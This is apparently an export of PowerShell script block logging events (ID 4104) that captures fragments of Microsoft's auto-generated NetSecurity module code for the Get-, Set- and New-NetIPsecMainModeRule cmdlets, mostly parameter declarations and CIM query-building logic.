    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase1AuthSet')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecMainModeCryptoSet')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [Alias('Session')]
    [ValidateNotNullOrEmpty()]
    [CimSession[]]
    ${CimSession},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallAddressFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallProfile')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase1AuthSet')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecMainModeCryptoSet')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [int]
    ${ThrottleLimit},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallAddressFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallProfile')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase1AuthSet')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecMainModeCryptoSet')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [switch]
    ${AsJob},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallAddressFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallProfile')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase1AuthSet')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecMainModeCryptoSet')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [switch]
    ${PassThru})

    DynamicParam {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()
                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)

                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])
                {
                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()
                }
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }

    Begin {
        $__cmdletization_exceptionHasBeenThrown = $false
        try 
        {
            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters
            $__cmdletization_objectModelWrapper.BeginProcessing()
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    Process {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
    $__cmdletization_queryBuilder = $__cmdletization_objectModelWrapper.GetQueryBuilder()
    if ($PSBoundParameters.ContainsKey('Name') -and (@('ByName') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Name})
        $__cmdletization_queryBuilder.FilterByProperty('InstanceID', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('DisplayName') -and (@('ByDisplayName') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${DisplayName})
        $__cmdletization_queryBuilder.FilterByProperty('DisplayName', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Description') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Description})
        $__cmdletization_queryBuilder.FilterByProperty('Description', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('DisplayGroup') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${DisplayGroup})
        $__cmdletization_queryBuilder.FilterByProperty('DisplayGroup', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Group') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Group})
        $__cmdletization_queryBuilder.FilterByProperty('RuleGroup', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Enabled') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Enabled})
        $__cmdletization_queryBuilder.FilterByProperty('Enabled', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('MainModeCryptoSet') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${MainModeCryptoSet})
        $__cmdletization_queryBuilder.FilterByProperty('MainModeCryptoSet', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Phase1AuthSet') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Phase1AuthSet})
        $__cmdletization_queryBuilder.FilterByProperty('Phase1AuthSet', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('PrimaryStatus') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${PrimaryStatus})
        $__cmdletization_queryBuilder.FilterByProperty('PrimaryStatus', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Status') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Status})
        $__cmdletization_queryBuilder.FilterByProperty('Status', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('PolicyStoreSource') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${PolicyStoreSource})
        $__cmdletization_queryBuilder.FilterByProperty('PolicyStoreSource', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('PolicyStoreSourceType') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${PolicyStoreSourceType})
        $__cmdletization_queryBuilder.FilterByProperty('PolicyStoreSourceType', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AssociatedNetFirewallAddressFilter') -and (@('ByAssociatedNetFirewallAddressFilter') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.FilterByAssociatedInstance(${AssociatedNetFirewallAddressFilter}, 'MSFT_NetMainModeRuleFilterByAddress', 'PartComponent', 'GroupComponent', 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AssociatedNetFirewallProfile') -and (@('ByAssociatedNetFirewallProfile') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.FilterByAssociatedInstance(${AssociatedNetFir

ScriptBlock ID: 4cfc0bc4-892a-446d-8c97-3f4fcceb24f0
Path: "
"07-08-2025 18:31:34","4104","Warning","Creating Scriptblock text (3 of 9):
ng()
            }
        }
        catch
        {
            throw
        }
    }

    # .EXTERNALHELP NetIPsecMainModeRule.cmdletDefinition.cdxml-Help.xml
}
Microsoft.PowerShell.Core\Export-ModuleMember -Function 'Get-NetIPsecMainModeRule' -Alias '*'
        

function Set-NetIPsecMainModeRule
{
    [CmdletBinding(SupportsShouldProcess=$true, ConfirmImpact='Medium', PositionalBinding=$false)]
    
    [OutputType([Microsoft.Management.Infrastructure.CimInstance])]
[OutputType('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetMainModeRule')]

    param(
    
    [Parameter(ParameterSetName='ByName', Mandatory=$true, Position=0)]
    [Alias('ID')]
    [ValidateNotNull()]
    [string[]]
    ${Name},

    [Parameter(ParameterSetName='ByDisplayName', Mandatory=$true)]
    [ValidateNotNull()]
    [string[]]
    ${DisplayName},

    [Parameter(ParameterSetName='ByDisplayGroup', Mandatory=$true)]
    [ValidateNotNull()]
    [string[]]
    ${DisplayGroup},

    [Parameter(ParameterSetName='ByGroup', Mandatory=$true)]
    [ValidateNotNull()]
    [string[]]
    ${Group},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByDisplayGroup')]
    [Parameter(ParameterSetName='ByGroup')]
    [string]
    ${PolicyStore},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByDisplayGroup')]
    [Parameter(ParameterSetName='ByGroup')]
    [string]
    ${GPOSession},

    [Parameter(ParameterSetName='InputObject (cdxml)', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#MSFT_NetMainModeRule')]
    [ValidateNotNull()]
    [ciminstance[]]
    ${InputObject},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByDisplayGroup')]
    [Parameter(ParameterSetName='ByGroup')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [string]
    ${NewDisplayName},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByDisplayGroup')]
    [Parameter(ParameterSetName='ByGroup')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [string]
    ${Description},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByDisplayGroup')]
    [Parameter(ParameterSetName='ByGroup')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Enabled]
    ${Enabled},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByDisplayGroup')]
    [Parameter(ParameterSetName='ByGroup')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Profile]
    ${Profile},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByDisplayGroup')]
    [Parameter(ParameterSetName='ByGroup')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [string[]]
    ${Platform},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByDisplayGroup')]
    [Parameter(ParameterSetName='ByGroup')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [string]
    ${MainModeCryptoSet},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByDisplayGroup')]
    [Parameter(ParameterSetName='ByGroup')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [string]
    ${Phase1AuthSet},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByDisplayGroup')]
    [Parameter(ParameterSetName='ByGroup')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [string[]]
    ${LocalAddress},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByDisplayGroup')]
    [Parameter(ParameterSetName='ByGroup')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [string[]]
    ${RemoteAddress},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByDisplayGroup')]
    [Parameter(ParameterSetName='ByGroup')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [Alias('Session')]
    [ValidateNotNullOrEmpty()]
    [CimSession[]]
    ${CimSession},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByDisplayGroup')]
    [Parameter(ParameterSetName='ByGroup')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [int]
    ${ThrottleLimit},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByDisplayGroup')]
    [Parameter(ParameterSetName='ByGroup')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [switch]
    ${AsJob},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByDisplayGroup')]
    [Parameter(ParameterSetName='ByGroup')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [switch]
    ${PassThru})

    DynamicParam {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()
                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)

                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])
                {
                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()
                }
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }

    Begin {
        $__cmdletization_exceptionHasBeenThrown = $false
        try 
        {
            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters
            $__cmdletization_objectModelWrapper.BeginProcessing()
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    Process {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
    $__cmdletization_queryBuilder = $__cmdletization_objectModelWrapper.GetQueryBuilder()
    if ($PSBoundParameters.ContainsKey('Name') -and (@('ByName') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Name})
        $__cmdletization_queryBuilder.FilterByProperty('InstanceID', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('DisplayName') -and (@('ByDisplayName') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${DisplayName})
        $__cmdletization_queryBuilder.FilterByProperty('DisplayName', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('DisplayGroup') -and (@('ByDisplayGroup') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${DisplayGroup})
        $__cmdletization_queryBuilder.FilterByProperty('DisplayGroup', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Group') -and (@('ByGroup') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Group})
        $__cmdletization_queryBuilder.FilterByProperty('RuleGroup', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('PolicyStore') -and (@('ByName', 'ByDisplayName', 'ByDisplayGroup', 'ByGroup') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('PolicyStore', ${PolicyStore})
    }
    if ($PSBoundParameters.ContainsKey('GPOSession') -and (@('ByName', 'ByDisplayName', 'ByDisplayGroup', 'ByGroup') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('GPOSession', ${GPOSession})
    }


    $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()
    switch -exact ($PSCmdlet.ParameterSetName) { 
        { @('ByName', 'ByDisplayName', 'ByDisplayGroup', 'ByGroup', 'InputObject (cdxml)') -contains $_ } {
          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('NewDisplayName')) {
            [object]$__cmdletization_value = ${NewDisplayName}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ElementName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ElementName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('Description')) {
            [object]$__cmdletization_value = ${Description}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Description'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Description'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('Enabled')) {
            [object]$__cmdletization_value = ${Enabled}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Enabled'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Enabled'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Enabled'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Enabled'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('Profile')) {
            [object]$__cmdletization_value = ${Profile}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Profiles'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Profile'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Profiles'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Profile'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('Platform')) {
            [object]$__cmdletization_value = ${Platform}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Platforms'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Platforms'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('MainModeCryptoSet')) {
            [object]$__cmdletization_value = ${MainModeCryptoSet}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'MainModeCryptoSet'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'MainModeCryptoSet'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('Phase1AuthSet')) {
            [object]$__cmdletization_value = ${Phase1AuthSet}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Phase1AuthSet'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Phase1AuthSet'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('LocalAddress')) {
            [object]$__cmdletization_value = ${LocalAddress}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:Ope

ScriptBlock ID: 4cfc0bc4-892a-446d-8c97-3f4fcceb24f0
Path: "
"07-08-2025 18:31:34","4104","Warning","Creating Scriptblock text (2 of 9):
n_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:RemoteAddress'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

      $__cmdletization_returnValue = $null
      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('cim:CreateInstance', $__cmdletization_methodParameters, $__cmdletization_returnValue)
      $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_methodInvocationInfo)

            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    End {
        try
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper.EndProcessing()
            }
        }
        catch
        {
            throw
        }
    }

    # .EXTERNALHELP NetIPsecMainModeRule.cmdletDefinition.cdxml-Help.xml
}
Microsoft.PowerShell.Core\Export-ModuleMember -Function 'New-NetIPsecMainModeRule' -Alias '*'
        

function Get-NetIPsecMainModeRule
{
    [CmdletBinding(DefaultParameterSetName='GetAll', PositionalBinding=$false)]
    
    [OutputType([Microsoft.Management.Infrastructure.CimInstance])]
[OutputType('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetMainModeRule')]

    param(
    
    [Parameter(ParameterSetName='ByName', Mandatory=$true, Position=0)]
    [Alias('ID')]
    [ValidateNotNull()]
    [string[]]
    ${Name},

    [Parameter(ParameterSetName='ByDisplayName', Mandatory=$true)]
    [ValidateNotNull()]
    [string[]]
    ${DisplayName},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${Description},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${DisplayGroup},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${Group},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Enabled[]]
    ${Enabled},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${MainModeCryptoSet},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${Phase1AuthSet},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.PrimaryStatus[]]
    ${PrimaryStatus},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${Status},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${PolicyStoreSource},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.PolicyStoreType[]]
    ${PolicyStoreSourceType},

    [Parameter(ParameterSetName='ByAssociatedNetFirewallAddressFilter', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetAddressFilter')]
    [ValidateNotNull()]
    [ciminstance]
    ${AssociatedNetFirewallAddressFilter},

    [Parameter(ParameterSetName='ByAssociatedNetFirewallProfile', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetFirewallProfile')]
    [ValidateNotNull()]
    [ciminstance]
    ${AssociatedNetFirewallProfile},

    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase1AuthSet', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetIKEP1AuthSet')]
    [ValidateNotNull()]
    [ciminstance]
    ${AssociatedNetIPsecPhase1AuthSet},

    [Parameter(ParameterSetName='ByAssociatedNetIPsecMainModeCryptoSet', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetIKEMMCryptoSet')]
    [ValidateNotNull()]
    [ciminstance]
    ${AssociatedNetIPsecMainModeCryptoSet},

    [Parameter(ParameterSetName='GetAll')]
    [switch]
    ${All},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallAddressFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallProfile')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase1AuthSet')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecMainModeCryptoSet')]
    [Parameter(ParameterSetName='GetAll')]
    [string]
    ${PolicyStore},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallAddressFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallProfile')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase1AuthSet')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecMainModeCryptoSet')]
    [Parameter(ParameterSetName='GetAll')]
    [string]
    ${GPOSession},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallAddressFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallProfile')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase1AuthSet')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecMainModeCryptoSet')]
    [Parameter(ParameterSetName='GetAll')]
    [switch]
    ${TracePolicyStore},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallAddressFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallProfile')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase1AuthSet')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecMainModeCryptoSet')]
    [Parameter(ParameterSetName='GetAll')]
    [Alias('Session')]
    [ValidateNotNullOrEmpty()]
    [CimSession[]]
    ${CimSession},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallAddressFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallProfile')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase1AuthSet')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecMainModeCryptoSet')]
    [Parameter(ParameterSetName='GetAll')]
    [int]
    ${ThrottleLimit},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallAddressFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallProfile')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase1AuthSet')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecMainModeCryptoSet')]
    [Parameter(ParameterSetName='GetAll')]
    [switch]
    ${AsJob})

    DynamicParam {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()
                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)

                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])
                {
                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()
                }
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }

    Begin {
        $__cmdletization_exceptionHasBeenThrown = $false
